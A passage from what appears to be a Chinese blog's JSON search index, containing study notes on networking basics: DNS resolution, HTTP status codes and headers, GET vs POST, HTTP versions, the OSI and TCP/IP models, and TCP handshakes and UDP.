服务端推送\n在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端\n\n9.2.4 二进制格式\nHTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式\n\n","categories":["http"],"tags":["http"]},{"title":"DNS协议","url":"/2018/04/25/http/DNS%E5%8D%8F%E8%AE%AE/","content":"一、是什么DNS（Domain Names System），域名系统，是互联网一项服务，是进行域名和与之相对应的 IP 地址进行转换的服务器\n简单来讲，DNS相当于一个翻译官，负责将域名翻译成ip地址\n\nIP 地址：一长串能够唯一地标记网络上的计算机的数字\n域名：是由一串用点分隔的名字组成的 Internet 上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识\n\n\n二、域名域名是一个具有层次的结构，从上到下一次为根域名、顶级域名、二级域名、三级域名…\n\n例如www.xxx.com，www为三级域名、xxx为二级域名、com为顶级域名，系统为用户做了兼容，域名末尾的根域名.一般不需要输入\n在域名的每一层都会有一个域名服务器，如下图：\n\n除此之外，还有电脑默认的本地域名服务器\n三、查询方式DNS 查询的方式有两种：\n\n递归查询：如果 A 请求 B，那么 B 作为请求的接收者一定要给 A 想要的答案\n\n\n\n迭代查询：如果接收者 B 没有请求者 A 所需要的准确内容，接收者 B 将告诉请求者 A，如何去获得这个内容，但是自己并不去发出请求\n\n\n四、域名缓存在域名服务器解析的时候，使用缓存保存域名和IP地址的映射\n计算机中DNS的记录也分成了两种缓存方式：\n\n浏览器缓存：浏览器在获取网站域名的实际 IP 地址后会对其进行缓存，减少网络请求的损耗\n操作系统缓存：操作系统的缓存其实是用户自己配置的 hosts 文件\n\n五、查询过程解析域名的过程如下：\n\n首先搜索浏览器的 DNS 缓存，缓存中维护一张域名与 IP 地址的对应表\n若没有命中，则继续搜索操作系统的 DNS 缓存\n若仍然没有命中，则操作系统将域名发送至本地域名服务器，本地域名服务器采用递归查询自己的 DNS 缓存，查找成功则返回结果\n若本地域名服务器的 DNS 缓存没有命中，则本地域名服务器向上级域名服务器进行迭代查询\n首先本地域名服务器向根域名服务器发起请求，根域名服务器返回顶级域名服务器的地址给本地服务器\n本地域名服务器拿到这个顶级域名服务器的地址后，就向其发起请求，获取权限域名服务器的地址\n本地域名服务器根据权限域名服务器的地址向其发起请求，最终得到该域名对应的 IP 地址\n\n\n本地域名服务器将得到的 IP 地址返回给操作系统，同时自己将 IP 地址缓存起来\n操作系统将 IP 地址返回给浏览器，同时自己也将 IP 地址缓存起\n至此，浏览器就得到了域名对应的 IP 地址，并将 IP 地址缓存起\n\n流程如下图所示：\n\n","categories":["http"],"tags":["http"]},{"title":"HTTP 常见的状态码","url":"/2018/05/01/http/HTTP%20%E5%B8%B8%E8%A7%81%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81/","content":"一、是什么HTTP状态码（英语：HTTP Status Code），用以表示网页服务器超文本传输协议响应状态的3位数字代码\n它由 RFC 2616规范定义的，并得到 RFC 2518、RFC 2817、RFC 2295、RFC 2774与 RFC 4918等规范扩展\n简单来讲，http状态码的作用是服务器告诉客户端当前请求响应的状态，通过状态码就能判断和分析服务器的运行状态\n二、分类状态码第一位数字决定了不同的响应状态，有如下：\n\n1 表示消息\n2 表示成功\n3 表示重定向\n4 表示请求错误\n5 表示服务器错误\n\n1xx代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束\n常见的有：\n\n100（客户端继续发送请求，这是临时响应）：这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应\n101：服务器根据客户端的请求切换协议，主要用于websocket或http2升级\n\n2xx代表请求已成功被服务器接收、理解、并接受\n常见的有：\n\n200（成功）：请求已成功，请求所希望的响应头或数据体将随此响应返回\n201（已创建）：请求成功并且服务器创建了新的资源\n202（已创建）：服务器已经接收请求，但尚未处理\n203（非授权信息）：服务器已成功处理请求，但返回的信息可能来自另一来源\n204（无内容）：服务器成功处理请求，但没有返回任何内容\n205（重置内容）：服务器成功处理请求，但没有返回任何内容\n206（部分内容）：服务器成功处理了部分请求\n\n3xx表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向\n常见的有：\n\n300（多种选择）：针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择\n301（永久移动）：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置\n302（临时移动）： 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求\n303（查看其他位置）：请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码\n305 （使用代理）： 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理\n307 （临时重定向）： 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求\n\n4xx代表了客户端看起来可能发生了错误，妨碍了服务器的处理\n常见的有：\n\n400（错误请求）： 服务器不理解请求的语法\n401（未授权）： 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。\n403（禁止）： 服务器拒绝请求\n404（未找到）： 服务器找不到请求的网页\n405（方法禁用）： 禁用请求中指定的方法\n406（不接受）： 无法使用请求的内容特性响应请求的网页\n407（需要代理授权）： 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理\n408（请求超时）： 服务器等候请求时发生超时\n\n5xx表示服务器无法完成明显有效的请求。这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生\n常见的有：\n\n500（服务器内部错误）：服务器遇到错误，无法完成请求\n501（尚未实施）：服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码\n502（错误网关）： 服务器作为网关或代理，从上游服务器收到无效响应\n503（服务不可用）： 服务器目前无法使用（由于超载或停机维护）\n504（网关超时）： 服务器作为网关或代理，但是没有及时从上游服务器收到请求\n505（HTTP 版本不受支持）： 服务器不支持请求中所用的 HTTP 协议版本\n\n三、适用场景下面给出一些状态码的适用场景：\n\n100：客户端在发送POST数据给服务器前，征询服务器情况，看服务器是否处理POST的数据，如果不处理，客户端则不上传POST数据，如果处理，则POST上传数据。常用于POST大数据传输\n206：一般用来做断点续传，或者是视频文件等大文件的加载\n301：永久重定向会缓存。新域名替换旧域名，旧的域名不再使用时，用户访问旧域名时用301就重定向到新的域名\n302：临时重定向不会缓存，常用 于未登陆的用户访问用户中心重定向到登录页面\n304：协商缓存，告诉客户端有缓存，直接使用缓存中的数据，返回页面的只有头部信息，是没有内容部分\n400：参数有误，请求无法被服务器识别\n403：告诉客户端进制访问该站点或者资源，如在外网环境下，然后访问只有内网IP才能访问的时候则返回\n404：服务器找不到资源时，或者服务器拒绝请求又不想说明理由时\n503：服务器停机维护时，主动用503响应请求或 nginx 设置限速，超过限速，会返回503\n504：网关超时\n\n","categories":["http"],"tags":["http"]},{"title":"GET 和 POST 的区别","url":"/2018/04/27/http/GET%20%E5%92%8C%20POST%20%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、是什么GET和POST，两者是HTTP协议中发送请求的方法\nGETGET方法请求一个指定资源的表示形式，使用GET的请求应该只被用于获取数据\nPOSTPOST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用\n本质上都是TCP链接，并无差别\n但是由于HTTP的规定和浏览器&#x2F;服务器的限制，导致他们在应用过程中会体现出一些区别\n二、区别从w3schools得到的标准答案的区别如下：\n\nGET在浏览器回退时是无害的，而POST会再次提交请求。\nGET产生的URL地址可以被Bookmark，而POST不可以。\nGET请求会被浏览器主动cache，而POST不会，除非手动设置。\nGET请求只能进行url编码，而POST支持多种编码方式。\nGET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。\nGET请求在URL中传送的参数是有长度限制的，而POST没有。\n对参数的数据类型，GET只接受ASCII字符，而POST没有限制。\nGET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。\nGET参数通过URL传递，POST放在Request body中\n\n参数位置貌似从上面看到GET与POST请求区别非常大，但两者实质并没有区别\n无论 GET还是 POST，用的都是同一个传输层协议，所以在传输上没有区别\n当不携带参数的时候，两者最大的区别为第一行方法名不同\n\nPOST &#x2F;uri HTTP&#x2F;1.1 \\r\\n\nGET &#x2F;uri HTTP&#x2F;1.1 \\r\\n\n\n当携带参数的时候，我们都知道GET请求是放在url中，POST则放在body中\nGET 方法简约版报文是这样的\nGET /index.html?name=qiming.c&amp;age=22 HTTP/1.1Host: localhost\n\nPOST方法简约版报文是这样的\nPOST /index.html HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedname=qiming.c&amp;age=22\n\n注意：这里只是约定，并不属于HTTP规范，相反的，我们可以在POST请求中url中写入参数，或者GET请求中的body携带参数\n参数长度HTTP协议没有Body和 URL 的长度限制，对 URL限制的大多是浏览器和服务器的原因\nIE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持\n这里限制的是整个URL长度，而不仅仅是参数值的长度\n服务器处理长URL 要消耗比较多的资源，为了性能和安全考虑，会给 URL 长度加限制\n安全POST比GET 安全，因为数据在地址栏上不可见\n然而，从传输的角度来说，他们都是不安全的，因为HTTP 在网络上是明文传输的，只要在网络节点上捉包，就能完整地获取数据报文\n只有使用HTTPS才能加密安全\n数据包对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）\n对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok\n并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次\n","categories":["http"],"tags":["http"]},{"title":"HTTP1.0/1.1/2.0 的区别","url":"/2018/05/03/http/HTTP1.01.12.0%20%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、HTTP1.0HTTP协议的第二个版本，第一个在通讯中指定版本号的HTTP协议版本\nHTTP 1.0 浏览器与服务器只保持短暂的连接，每次请求都需要与服务器建立一个TCP连接\n服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求\n简单来讲，每次与服务器交互，都需要新开一个连接\n\n例如，解析html文件，当发现文件中存在资源文件的时候，这时候又创建单独的链接\n最终导致，一个html文件的访问包含了多次的请求和响应，每次请求都需要创建连接、关系连接\n这种形式明显造成了性能上的缺陷\n如果需要建立长连接，需要设置一个非标准的Connection字段 Connection: keep-alive\n二、HTTP1.1在HTTP1.1中，默认支持长连接（Connection: keep-alive），即在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟\n建立一次连接，多次请求均由这个连接完成\n\n这样，在加载html文件的时候，文件中多个请求和响应就可以在一个连接中传输\n同时，HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容，这样也显著地减少了整个下载过程所需要的时间\n同时，HTTP1.1在HTTP1.0的基础上，增加更多的请求头和响应头来完善的功能，如下：\n\n引入了更多的缓存控制策略，如If-Unmodified-Since, If-Match, If-None-Match等缓存头来控制缓存策略\n引入range，允许值请求资源某个部分\n引入host，实现了在一台WEB服务器上可以在同一个IP地址和端口号上使用不同的主机名来创建多个虚拟WEB站点\n\n并且还添加了其他的请求方法：put、delete、options…\n三、HTTP2.0而HTTP2.0在相比之前版本，性能上有很大的提升，如添加了一个特性：\n\n多路复用\n二进制分帧\n首部压缩\n服务器推送\n\n多路复用HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”\n\n上图中，可以看到第四步中css、js资源是同时发送到服务端\n二进制分帧帧是HTTP2通信中最小单位信息\nHTTP/2 采用二进制格式传输数据，而非 HTTP 1.x的文本格式，解析起来更高效\n将请求和响应数据分割为更小的帧，并且它们采用二进制编码\nHTTP2中，同域名下所有通信都在单个连接上完成，该连接可以承载任意数量的双向数据流\n每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，根据帧首部的流标识可以重新组装，这也是多路复用同时发送数据的实现条件\n首部压缩HTTP/2在客户端和服务器端使用“首部表”来跟踪和存储之前发送的键值对，对于相同的数据，不再通过每次请求和响应发送\n首部表在HTTP/2的连接存续期内始终存在，由客户端和服务器共同渐进地更新\n例如：下图中的两个请求， 请求一发送了所有的头部字段，第二个请求则只需要发送差异数据，这样可以减少冗余数据，降低开销\n\n服务器推送HTTP2引入服务器推送，允许服务端推送资源给客户端\n服务器会顺便把一些客户端需要的资源一起推送到客户端，如在响应一个页面请求中，就可以随同页面的其它资源\n免得客户端再次创建连接发送请求到服务器端获取\n这种方式非常合适加载静态资源\n\n四、总结HTTP1.0：\n\n浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接\n\nHTTP1.1：\n\n引入了持久连接，即TCP连接默认不关闭，可以被多个请求复用\n在同一个TCP连接里面，客户端可以同时发送多个请求\n虽然允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的，服务器只有处理完一个请求，才会接着处理下一个请求。如果前面的处理特别慢，后面就会有许多请求排队等着\n新增了一些请求方法\n新增了一些请求头和响应头\n\nHTTP2.0：\n\n采用二进制格式而非文本格式\n完全多路复用，而非有序并阻塞的、只需一个连接即可实现并行\n使用报头压缩，降低开销\n服务器推送\n\n","categories":["http"],"tags":["http"]},{"title":"HTTP 常见的请求头","url":"/2018/04/30/http/HTTP%20%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4/","content":"一、是什么HTTP头字段（HTTP header fields）,是指在超文本传输协议（HTTP）的请求和响应消息中的消息头部分\n它们定义了一个超文本传输协议事务中的操作参数\nHTTP头部字段可以自己根据需要定义，因此可能在 Web服务器和浏览器上发现非标准的头字段\n下面是一个HTTP请求的请求头：\nGET /home.html HTTP/1.1Host: developer.mozilla.orgUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: https://developer.mozilla.org/testpage.htmlConnection: keep-aliveUpgrade-Insecure-Requests: 1If-Modified-Since: Mon, 18 Jul 2016 02:36:04 GMTIf-None-Match: &quot;c561c68d0ba92bbeb8b0fff2a9199f722e3a621a&quot;Cache-Control: max-age=0\n\n二、分类常见的请求字段如下表所示：\n\n\n\n字段名\n说明\n示例\n\n\n\nAccept\n能够接受的回应内容类型（Content-Types）\nAccept: text&#x2F;plain\n\n\nAccept-Charset\n能够接受的字符集\nAccept-Charset: utf-8\n\n\nAccept-Encoding\n能够接受的编码方式列表\nAccept-Encoding: gzip, deflate\n\n\nAccept-Language\n能够接受的回应内容的自然语言列表\nAccept-Language: en-US\n\n\nAuthorization\n用于超文本传输协议的认证的认证信息\nAuthorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;\n\n\nCache-Control\n用来指定在这次的请求&#x2F;响应链中的所有缓存机制 都必须 遵守的指令\nCache-Control: no-cache\n\n\nConnection\n该浏览器想要优先使用的连接类型\nConnection: keep-alive Connection: Upgrade\n\n\nCookie\n服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie\nCookie: $Version&#x3D;1; Skin&#x3D;new;\n\n\nContent-Length\n以 八位字节数组 （8位的字节）表示的请求体的长度\nContent-Length: 348\n\n\nContent-Type\n请求体的 多媒体类型\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\nDate\n发送该消息的日期和时间\nDate: Tue, 15 Nov 1994 08:12:31 GMT\n\n\nExpect\n表明客户端要求服务器做出特定的行为\nExpect: 100-continue\n\n\nHost\n服务器的域名(用于虚拟主机 )，以及服务器所监听的传输控制协议端口号\nHost: en.wikipedia.org:80 Host: en.wikipedia.org\n\n\nIf-Match\n仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源\nIf-Match: “737060cd8c284d8af7ad3082f209582d”\n\n\nIf-Modified-Since\n允许在对应的内容未被修改的情况下返回304未修改\nIf-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n\n\nIf-None-Match\n允许在对应的内容未被修改的情况下返回304未修改\nIf-None-Match: “737060cd8c284d8af7ad3082f209582d”\n\n\nIf-Range\n如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体\nIf-Range: “737060cd8c284d8af7ad3082f209582d”\n\n\nRange\n仅请求某个实体的一部分\nRange: bytes&#x3D;500-999\n\n\nUser-Agent\n浏览器的浏览器身份标识字符串\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:12.0) Gecko&#x2F;20100101 Firefox&#x2F;21.0\n\n\nOrigin\n发起一个针对 跨来源资源共享 的请求\nOrigin: http://www.example-social-network.com\n\n\n三、使用场景通过配合请求头和响应头，可以满足一些场景的功能实现：\n协商缓存协商缓存是利用的是【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】这两对请求头响应头来管理的\nLast-Modified 表示本地文件最后修改日期，浏览器会在request header加上If-Modified-Since（上次返回的Last-Modified的值），询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来\nEtag就像一个指纹，资源变化都会导致ETag变化，跟最后修改时间没有关系，ETag可以保证每一个资源是唯一的\nIf-None-Match的header会将上次返回的Etag发送给服务器，询问该资源的Etag是否有更新，有变动就会发送新的资源回来\n而强制缓存不需要发送请求到服务端，根据请求头expires和cache-control判断是否命中强缓存\n强制缓存与协商缓存的流程图如下所示：\n\n会话状态cookie，类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据，通过响应头set-cookie决定\n作为一段一般不超过 4KB 的小型文本数据，它由一个名称（Name）、一个值（Value）和其它几个用于控制 Cookie有效期、安全性、使用范围的可选属性组成\nCookie 主要用于以下三个方面：\n\n会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n个性化设置（如用户自定义设置、主题等）\n浏览器行为跟踪（如跟踪分析用户行为等\n\n","categories":["http"],"tags":["http"]},{"title":"OSI七层模型","url":"/2018/05/08/http/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","content":"一、是什么OSI （Open System Interconnect）模型全称为开放式通信系统互连参考模型，是国际标准化组织 ( ISO ) 提出的一个试图使各种计算机在世界范围内互连为网络的标准框架\nOSI将计算机网络体系结构划分为七层，每一层实现各自的功能和协议，并完成与相邻层的接口通信。即每一层扮演固定的角色，互不打扰\n二、划分OSI主要划分了七层，如下图所示：\n\n应用层应用层位于 OSI 参考模型的第七层，其作用是通过应用程序间的交互来完成特定的网络应用\n该层协议定义了应用进程之间的交互规则，通过不同的应用层协议为不同的网络应用提供服务。例如域名系统 DNS，支持万维网应用的 HTTP 协议，电子邮件系统采用的 SMTP协议等\n在应用层交互的数据单元我们称之为报文\n表示层表示层的作用是使通信的应用程序能够解释交换数据的含义，其位于 OSI参考模型的第六层，向上为应用层提供服务，向下接收来自会话层的服务\n该层提供的服务主要包括数据压缩，数据加密以及数据描述，使应用程序不必担心在各台计算机中表示和存储的内部格式差异\n会话层会话层就是负责建立、管理和终止表示层实体之间的通信会话\n该层提供了数据交换的定界和同步功能，包括了建立检查点和恢复方案的方法\n传输层传输层的主要任务是为两台主机进程之间的通信提供服务，处理数据包错误、数据包次序，以及其他一些关键传输问题\n传输层向高层屏蔽了下层数据通信的细节。因此，它是计算机通信体系结构中关键的一层\n其中，主要的传输层协议是TCP和UDP\n网络层两台计算机之间传送数据时其通信链路往往不止一条，所传输的信息甚至可能经过很多通信子网\n网络层的主要任务就是选择合适的网间路由和交换节点，确保数据按时成功传送\n在发送数据时，网络层把传输层产生的报文或用户数据报封装成分组和包，向下传输到数据链路层\n在网络层使用的协议是无连接的网际协议（Internet Protocol）和许多路由协议，因此我们通常把该层简单地称为 IP 层\n#数据链路层数据链路层通常也叫做链路层，在物理层和网络层之间。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层协议\n在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP数据报组装成帧，在两个相邻节点间的链路上传送帧\n每一帧的数据可以分成：报头head和数据data两部分:\n\nhead 标明数据发送者、接受者、数据类型，如 MAC地址\ndata 存储了计算机之间交互的数据\n\n通过控制信息我们可以知道一个帧的起止比特位置，此外，也能使接收端检测出所收到的帧有无差错，如果发现差错，数据链路层能够简单的丢弃掉这个帧，以避免继续占用网络资源\n物理层作为OSI 参考模型中最低的一层，物理层的作用是实现计算机节点之间比特流的透明传送\n该层的主要任务是确定与传输媒体的接口的一些特性（机械特性、电气特性、功能特性，过程特性）\n该层主要是和硬件有关，与软件关系不大\n三、传输过程数据在各层之间的传输如下图所示：\n\n\n应用层报文被传送到运输层\n在最简单的情况下，运输层收取到报文并附上附加信息，该首部将被接收端的运输层使用\n应用层报文和运输层首部信息一道构成了运输层报文段。附加的信息可能包括：允许接收端运输层向上向适当的应用程序交付报文的信息以及差错检测位信息。该信息让接收端能够判断报文中的比特是否在途中已被改变\n运输层则向网络层传递该报文段，网络层增加了如源和目的端系统地址等网络层首部信息，生成了网络层数据报\n网络层数据报接下来被传递给链路层，在数据链路层数据包添加发送端 MAC 地址和接收端 MAC 地址后被封装成数据帧\n在物理层数据帧被封装成比特流，之后通过传输介质传送到对端\n对端再一步步解开封装，获取到传送的数据\n\n","categories":["http"],"tags":["http"]},{"title":"TCP/IP协议","url":"/2018/05/11/http/TCPIP%E5%8D%8F%E8%AE%AE/","content":"一、是什么TCP&#x2F;IP，传输控制协议&#x2F;网际协议，是指能够在多个不同网络间实现信息传输的协议簇\n\nTCP（传输控制协议）\n\n一种面向连接的、可靠的、基于字节流的传输层通信协议\n\nIP（网际协议）\n\n用于封包交换数据网络的协议\nTCP&#x2F;IP协议不仅仅指的是TCP和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇，\n只是因为在TCP/IP协议中TCP协议和IP协议最具代表性，所以通称为TCP&#x2F;IP协议族（英语：TCP&#x2F;IP Protocol Suite，或TCP&#x2F;IP Protocols）\n二、划分TCP&#x2F;IP协议族按层次分别了五层体系或者四层体系\n五层体系的协议结构是综合了 OSI 和 TCP&#x2F;IP 优点的一种协议，包括应用层、传输层、网络层、数据链路层和物理层\n五层协议的体系结构只是为介绍网络原理而设计的，实际应用还是 TCP&#x2F;IP 四层体系结构，包括应用层、传输层、网络层（网际互联层）、网络接口层\n如下图所示：\n\n五层体系应用层TCP/IP 模型将 OSI参考模型中的会话层、表示层和应用层的功能合并到一个应用层实现，通过不同的应用层协议为不同的应用提供服务\n如：FTP、Telnet、DNS、SMTP 等\n传输层该层对应于 OSI 参考模型的传输层，为上层实体提供源端到对端主机的通信功能\n传输层定义了两个主要协议：传输控制协议（TCP）和用户数据报协议（UDP）\n其中面向连接的 TCP 协议保证了数据的传输可靠性，面向无连接的 UDP 协议能够实现数据包简单、快速地传输\n网络层负责为分组网络中的不同主机提供通信服务，并通过选择合适的路由将数据传递到目标主机\n在发送数据时，网络层把运输层产生的报文段或用户数据封装成分组或包进行传送\n数据链路层数据链路层在两个相邻节点传输数据时，将网络层交下来的IP数据报组装成帧，在两个相邻节点之间的链路上传送帧\n物理层保数据可以在各种物理媒介上进行传输，为数据的传输提供可靠的环境\n四层体系TCP&#x2F;IP 的四层结构则如下表所示：\n\n\n\n层次名称\n单位\n功 能\n协 议\n\n\n\n网络接口层\n帧\n负责实际数据的传输，对应OSI参考模型的下两层\nHDLC（高级链路控制协议）PPP（点对点协议） SLIP（串行线路接口协议）\n\n\n网络层\n数据报\n负责网络间的寻址数据传输，对应OSI参考模型的第三层\nIP（网际协议） ICMP（网际控制消息协议）ARP（地址解析协议） RARP（反向地址解析协议）\n\n\n传输层\n报文段\n负责提供可靠的传输服务，对应OSI参考模型的第四层\nTCP（控制传输协议） UDP（用户数据报协议）\n\n\n应用层\n\n负责实现一切与应用程序相关的功能，对应OSI参考模型的上三层\nFTP（文件传输协议） HTTP（超文本传输协议） DNS（域名服务器协议）SMTP（简单邮件传输协议）NFS（网络文件系统协议）\n\n\n三、总结OSI 参考模型与 TCP&#x2F;IP 参考模型区别如下：\n相同点：\n\nOSI 参考模型与 TCP&#x2F;IP 参考模型都采用了层次结构\n都能够提供面向连接和无连接两种通信服务机制\n\n不同点：\n\nOSI 采用的七层模型； TCP&#x2F;IP 是四层或五层结构\nTCP&#x2F;IP 参考模型没有对网络接口层进行细分，只是一些概念性的描述； OSI 参考模型对服务和协议做了明确的区分\nOSI 参考模型虽然网络划分为七层，但实现起来较困难。TCP&#x2F;IP 参考模型作为一种简化的分层结构是可以的\nTCP&#x2F;IP协议去掉表示层和会话层的原因在于会话层、表示层、应用层都是在应用程序内部实现的，最终产出的是一个应用数据包，而应用程序之间是几乎无法实现代码的抽象共享的，这也就造成 OSI 设想中的应用程序维度的分层是无法实现的\n\n三种模型对应关系如下图所示：\n\n","categories":["http"],"tags":["http"]},{"title":"TCP三次握手和四次挥手","url":"/2018/05/15/http/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/","content":"一、三次握手三次握手（Three-way Handshake）其实就是指建立一个TCP连接时，需要客户端和服务器总共发送3个包\n主要作用就是为了确认双方的接收能力和发送能力是否正常、指定自己的初始化序列号为后面的可靠性传送做准备\n过程如下：\n\n第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN(c)，此时客户端处于 SYN_SENT 状态\n第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，为了确认客户端的 SYN，将客户端的 ISN+1作为ACK的值，此时服务器处于 SYN_RCVD 的状态\n第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，值为服务器的ISN+1。此时客户端处于 ESTABLISHED 状态。服务器收到 ACK 报文之后，也处于 ESTABLISHED 状态，此时，双方已建立起了连接\n\n\n上述每一次握手的作用如下：\n\n第一次握手：客户端发送网络包，服务端收到了 这样服务端就能得出结论：客户端的发送能力、服务端的接收能力是正常的。\n第二次握手：服务端发包，客户端收到了 这样客户端就能得出结论：服务端的接收、发送能力，客户端的接收、发送能力是正常的。不过此时服务器并不能确认客户端的接收能力是否正常\n第三次握手：客户端发包，服务端收到了。 这样服务端就能得出结论：客户端的接收、发送能力正常，服务器自己的发送、接收能力也正常\n\n通过三次握手，就能确定双方的接收和发送能力是正常的。之后就可以正常通信了\n为什么不是两次握手?如果是两次握手，发送端可以确定自己发送的信息能对方能收到，也能确定对方发的包自己能收到，但接收端只能确定对方发的包自己能收到 无法确定自己发的包对方能收到\n并且两次握手的话, 客户端有可能因为网络阻塞等原因会发送多个请求报文，延时到达的请求又会与服务器建立连接，浪费掉许多服务器的资源\n二、四次挥手tcp终止一个连接，需要经过四次挥手\n过程如下：\n\n第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态，停止发送数据，等待服务端的确认\n第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 +1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态\n第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态\n第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 +1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态\n\n\n四次挥手原因服务端在收到客户端断开连接Fin报文后，并不会立即关闭连接，而是先发送一个ACK包先告诉客户端收到关闭连接的请求，只有当服务器的所有报文发送完毕之后，才发送FIN报文断开连接，因此需要四次挥手\n三、总结一个完整的三次握手四次挥手如下图所示：\n\n","categories":["http"],"tags":["http"]},{"title":"TCP和UDP的区别","url":"/2018/05/13/http/TCP%E5%92%8CUDP%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"1. 基于连接vs无连接\nTCP是面向连接的协议。\nUDP是无连接的协议。UDP更加适合消息的多播发布，从单个点向多个点传输消息。\n\n2. 可靠性\nTCP提供交付保证，传输过程中丢失，将会重发。\nUDP是不可靠的，不提供任何交付保证。（网游和视频的丢包情况）\n\n3. 有序性\nTCP保证了消息的有序性，即使到达客户端顺序不同，TCP也会排序。\nUDP不提供有序性保证。\n\n4. 数据边界\nTCP不保存数据边界。虽然TCP也将在收集所有字节之后生成一个完整的消息，但是这些信息在传给传输给接受端之前将储存在TCP缓冲区，以确保更好的使用网络带宽。\nUDP保证。在UDP中，数据包单独发送的，只有当他们到达时，才会再次集成。包有明确的界限来哪些包已经收到，这意味着在消息发送后，在接收器接口将会有一个读操作，来生成一个完整的消息。\n\n5. 速度\nTCP速度慢\nUDP速度快。应用在在线视频媒体，电视广播和多人在线游戏。\n\n6. 发送消耗\nTCP是重量级。\nUDP是轻量级。因为UDP传输的信息中不承担任何间接创造连接，保证交货或秩序的的信息。这也反映在用于报头大小。\n\n7. 